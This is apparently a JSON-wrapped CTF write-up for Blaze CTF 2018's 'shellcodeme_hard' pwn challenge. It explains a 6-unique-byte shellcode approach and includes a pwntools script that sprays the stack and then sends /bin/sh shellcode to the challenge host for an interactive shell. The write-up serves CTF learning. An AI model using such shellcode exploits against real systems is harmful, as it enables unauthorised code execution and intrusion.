{"pageContext":{"html":"<p><a href=\"ctf=blaze-2018\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=game\"></a>\n<a href=\"techniques=shellcode\"></a></p>\n<h1>shellcodeme_hard (pwn-420)</h1>\n<pre><code>nc shellcodeme.420blaze.in 4200\n\nAuthor : aweinstock\n</code></pre>\n<p>Solving the easy version of this chall took me some time. However once that was done, I used the same technique to pwn this one.</p>\n<p>In this hard version the stack and registers were populated from /dev/urandom so that we don't have references to pivot through.\nThis made me do the chall in 6 unique bytes.</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='amd64', os='linux', log_level='info')\n\npayload = asm((\"push 0x40000000; \"*0x100)+(\"push rbx; \"*36)+\"push 0x400000; pop rbx; \"+(\"inc ebx; \"*0x86d)+\"push rbx; ret;\")\npayload2 = asm(shellcraft.amd64.linux.sh())\n\ns = remote(\"shellcodeme.420blaze.in\", 4200)\n\ns.sendline(payload)\ns.sendline(payload2)\n\ns.interactive()\ns.close()\n</code></pre>\n<p> The random values from the context seldom had 0s. So I sprayed the stack with a register to make <code>seen</code> for every character > 0.\nThen using the technique from <a href=\"/README-127672a2384852e6d56099c03727efaa.md\">here</a> to gain code execution.</p>","relativePath":"writeups/blaze-ctf-2018/pwn/shellcodeme_hard/sudhackar"}}